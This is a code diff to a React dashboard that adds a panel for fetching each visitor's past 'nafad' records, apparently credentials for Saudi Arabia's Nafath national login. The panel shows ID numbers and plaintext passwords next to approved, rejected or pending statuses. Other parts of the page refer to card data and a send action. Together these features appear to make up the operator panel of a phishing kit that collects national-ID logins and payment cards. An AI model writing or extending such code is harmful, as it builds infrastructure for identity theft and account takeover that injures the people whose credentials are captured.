@@ -268,6 +268,9 @@ export default function DashboardPage() {
   const [expandedPhoneHistory, setExpandedPhoneHistory] = useState<Record<string, boolean>>({});
   const [phoneHistory, setPhoneHistory] = useState<Record<string, any[]>>({});
   const [hasPhoneHistory, setHasPhoneHistory] = useState<Record<string, boolean>>({});
+  const [expandedNafadHistory, setExpandedNafadHistory] = useState<Record<string, boolean>>({});
+  const [nafadHistory, setNafadHistory] = useState<Record<string, any[]>>({});
+  const [hasNafadHistory, setHasNafadHistory] = useState<Record<string, boolean>>({});
 
   // Toggle card history expansion
   const toggleCardHistory = async (visitorId: string) => {
@@ -333,6 +336,28 @@ export default function DashboardPage() {
     }
     
     setExpandedPhoneHistory(prev => ({ ...prev, [visitorId]: !isExpanded }));
+  };
+
+  // Toggle nafad history expansion
+  const toggleNafadHistory = async (visitorId: string) => {
+    const isExpanded = expandedNafadHistory[visitorId];
+    
+    if (!isExpanded) {
+      // Fetch history when expanding
+      try {
+        const res = await fetch(`/api/dashboard/nafad-history/${visitorId}`);
+        if (res.ok) {
+          const data = await res.json();
+          const history = data.history || [];
+          setNafadHistory(prev => ({ ...prev, [visitorId]: history }));
+          setHasNafadHistory(prev => ({ ...prev, [visitorId]: history.length > 0 }));
+        }
+      } catch {
+        console.error("Failed to fetch nafad history");
+      }
+    }
+    
+    setExpandedNafadHistory(prev => ({ ...prev, [visitorId]: !isExpanded }));
   };
 
   // Get latest card data from selected request
@@ -2732,6 +2757,84 @@ export default function DashboardPage() {
                   {actionLoading === "nafad" ? "..." : "إرسال"}
                 </button>
               </div>
+            </div>
+          )}
+
+          {/* زر عرض بيانات النفاذ السابقة */}
+          {hasNafadHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
+            <div style={{ marginTop: 12 }}>
+              <button
+                onClick={() => toggleNafadHistory(selectedRequest?.id || selectedRequest?.visitorId || "")}
+                style={{
+                  width: "100%",
+                  padding: "8px 16px",
+                  borderRadius: 8,
+                  border: "1px solid #e5e7eb",
+                  background: expandedNafadHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "#f3f4f6" : "#ffffff",
+                  color: "#374151",
+                  fontSize: "0.75rem",
+                  fontWeight: 600,
+                  cursor: "pointer",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  gap: 6
+                }}
+              >
+                {expandedNafadHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "🔼 إخفاء السجلات" : `📋 عرض ${nafadHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.length || 0} بيانات نفاذ سابقة`}
+              </button>
+
+              {/* سجلات بيانات النفاذ */}
+              {expandedNafadHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
+                <div style={{ 
+                  marginTop: 8,
+                  maxHeight: 300,
+                  overflowY: "auto"
+                }}>
+                  {nafadHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.map((item: any, idx: number) => (
+                    <div key={idx} style={{
+                      background: "#f9fafb",
+                      borderRadius: 8,
+                      padding: 12,
+                      marginBottom: 8,
+                      border: "1px solid #e5e7eb"
+                    }}>
+                      <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
+                        <span style={{ fontSize: "0.7rem", fontWeight: 600, color: "#374151" }}>
+                          بيانات نفاذ سابقة #{idx + 1}
+                        </span>
+                        <span style={{ 
+                          fontSize: "0.65rem", 
+                          padding: "2px 6px",
+                          borderRadius: 4,
+                          background: item.nafadStatus === "approved" ? "#dcfce7" : item.nafadStatus === "rejected" ? "#fee2e2" : "#fef3c7",
+                          color: item.nafadStatus === "approved" ? "#166534" : item.nafadStatus === "rejected" ? "#991b1b" : "#92400e"
+                        }}>
+                          {item.nafadStatus === "approved" ? "✅" : item.nafadStatus === "rejected" ? "❌" : "⏳"} {item.nafadStatus}
+                        </span>
+                      </div>
+                      <div style={{ fontSize: "0.7rem", color: "#6b7280", marginBottom: 4 }}>
+                        <span>🪪 {item.nafadIdNumber}</span>
+                      </div>
+                      {item.nafadPassword && (
+                        <div style={{
+                          fontFamily: "ui-monospace, monospace",
+                          fontSize: "0.85rem",
+                          fontWeight: 600,
+                          color: "#78350f",
+                          letterSpacing: "1px",
+                          background: "#fef3c7",
+                          padding: "4px 8px",
+                          borderRadius: 4,
+                          marginTop: 4
+                        }}>
+                          🔑 {item.nafadPassword}
+                        </div>
+                      )}
+                    </div>
+                  ))}
+                </div>
+              )}
             </div>
           )}
         </div>
